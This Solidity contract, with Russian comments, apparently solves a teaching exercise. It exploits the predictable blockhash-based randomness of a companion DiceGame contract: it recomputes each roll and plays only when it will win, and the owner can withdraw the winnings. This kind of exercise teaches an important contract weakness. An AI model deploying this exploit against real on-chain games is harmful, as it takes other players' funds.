// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // 1. Вывод выигранного ETH владельцем контракта
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        if (_amount > address(this).balance) {
            revert InsufficientBalance(_amount, address(this).balance);
        }
        (bool sent, ) = payable(_addr).call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // 2. Предсказание броска и вызов игры только при 100% победе
    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            revert NotEnoughETH(0.002 ether, address(this).balance);
        }

        bytes32 prevHash = blockhash(block.number - 1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted roll:", roll);

        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        diceGame.rollTheDice{value: 0.002 ether}();
    }

    // 3. Функция для приема ETH (пополнение баланса и получение призов от DiceGame)
    receive() external payable {}
}